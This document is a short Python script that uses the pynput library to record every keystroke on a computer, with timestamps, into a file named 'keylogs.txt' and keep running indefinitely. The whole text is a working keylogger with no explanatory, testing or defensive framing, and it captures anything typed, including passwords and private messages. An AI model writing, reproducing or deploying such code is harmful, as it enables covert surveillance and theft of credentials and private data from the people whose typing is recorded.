from pynput import keyboard
import logging

logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    pass